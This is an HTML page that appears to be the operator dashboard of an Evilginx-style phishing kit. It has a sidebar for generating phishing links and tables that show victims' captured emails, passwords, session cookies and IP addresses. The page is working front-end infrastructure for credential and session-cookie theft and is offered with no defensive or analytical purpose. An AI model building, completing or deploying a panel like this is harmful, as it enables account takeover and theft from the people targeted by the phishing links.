<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dashboard | Evilginx</title>
  <link rel="stylesheet" href="styles.css" />
  
  <!-- Load Firebase compat SDKs and our scripts -->
  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
  <script defer src="firebase-config.js"></script>
  <script defer src="script.js"></script>
</head>
<body>
  <div class="sidebar">
    <button class="menu-btn" onclick="window.location.href='dashboard2.html'">💼 Generate Link</button>
    <button class="menu-btn" onclick="toggleTable('capturedSessionsTable')">📂 Captured Sessions</button>
    <button class="menu-btn" onclick="toggleTable('generatedLinksTable')">🔗 Generated Links</button>
    <button class="menu-btn" onclick="toggleTable('cookiesTable')">☠️ Cookies</button>
    <button class="menu-btn" onclick="window.location.href='dashboard3.html'">📜 Drakotech</button>
    <button class="menu-btn" onclick="logout()">🚪 Logout</button>
  </div>
  
  <div class="content">
    <h2>Dashboard</h2>
    <p>Welcome! Use the sidebar to view captured data.</p>
    
    <!-- Captured Sessions Table -->
    <div id="capturedSessionsTable" class="table-container">
      <h3>📂 Captured Sessions</h3>
      <table>
        <thead>
          <tr>
            <th>Email</th>
            <th>Password</th>
            <th>Cookies</th>
            <th>IP</th>
            <th>Timestamp</th>
          </tr>
        </thead>
        <tbody id="capturedSessions">
          <!-- Captured sessions will be populated here -->
        </tbody>
      </table>
    </div>
    
    <!-- Generated Links Table -->
    <div id="generatedLinksTable" class="table-container">
      <h3>🔗 Generated Links History</h3>
      <table>
        <thead>
          <tr>
            <th>Phishlet</th>
            <th>Link</th>
            <th>Timestamp</th>
            <th>IP Address</th>
          </tr>
        </thead>
        <tbody id="generatedLinks">
          <!-- Generated links history will be populated here -->
        </tbody>
      </table>
    </div>
    
    <!-- Cookies Table -->
    <div id="cookiesTable" class="table-container">
      <h3>☠️ Cookies</h3>
      <table>
        <thead>
          <tr>
            <th>Email</th>
            <th>Cookies</th>
            <th>Timestamp</th>
            <th>IP</th>
          </tr>
        </thead>
        <tbody id="cookies">
          <!-- Captured cookies will be populated here -->
        </tbody>
      </table>
    </div>
  </div>
</body>
</html>
